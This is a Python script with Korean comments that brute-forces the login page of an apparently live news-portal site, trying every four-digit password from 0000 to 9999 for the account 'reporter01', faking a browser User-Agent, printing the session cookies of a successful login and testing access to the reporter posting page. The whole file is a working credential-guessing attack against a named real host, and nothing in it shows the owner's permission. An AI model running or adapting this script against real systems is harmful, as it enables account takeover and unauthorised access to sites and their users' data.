import requests
import urllib3

# SSL 경고 메시지 숨기기 (필요 시 사용)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 1. 대상 URL 설정
BASE_URL = "https://news-portal-p2ay.onrender.com"
LOGIN_URL = f"{BASE_URL}/login.php"

# 브라우저 요청처럼 보이도록 헤더 설정
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

print("[*] 0000부터 9999까지 무작위 대입을 시작합니다...")

success_password = None

# 2. 0000부터 9999까지 루프 돌리기
for password_num in range(10000):
    # 숫자를 4자리 문자열 형태로 포맷팅 (예: 7 -> '0007', 123 -> '0123')
    current_password = f"{password_num:04d}"
    
    # 로그인 계정 정보 구성 (ID: reporter01)
    payload = {
        "username": "reporter01",
        "password": current_password
    }

    # 매 요청마다 세션을 새로 생성하거나, 기존 세션을 초기화하여 사용 가능합니다.
    session = requests.Session()
    session.headers.update(headers)

    try:
        # POST 요청 전송 (로그인 시도)
        response = session.post(LOGIN_URL, data=payload, allow_redirects=True)
        
        # 3. 로그인 실패 조건 확인
        # 응답 페이지 내용에 실패 문구가 없다면 로그인에 성공한 것으로 판단합니다.
        if "아이디 또는 비밀번호가 올바르지 않습니다" not in response.text:
            print(f"\n[+] 로그인 성공 비밀번호 발견!: {current_password}")
            success_password = current_password
            
            # 성공 시 추가 인증 페이지 접근 확인용 테스트
            print(f"[*] 발급받은 세션 쿠키: {session.cookies.get_dict()}")
            reporter_url = f"{BASE_URL}/reporter/write.php"
            reporter_res = session.get(reporter_url)
            
            if reporter_res.status_code == 200:
                print("[+] 기자 페이지(/reporter/write.php) 접근에 성공했습니다.")
            break
            
    except requests.exceptions.RequestException as e:
        print(f"\n[-] 에러 발생 (비밀번호 {current_password} 시도 중): {e}")
        break

    # 진행 상황을 한 줄에 표시 (선택 사항)
    if password_num % 100 == 0:
        print(f"[*] 현재 테스트 중... ({current_password}/9999)", end="\r")

if not success_password:
    print("\n[-] 0000부터 9999까지의 범위 내에서 올바른 비밀번호를 찾지 못했습니다.")
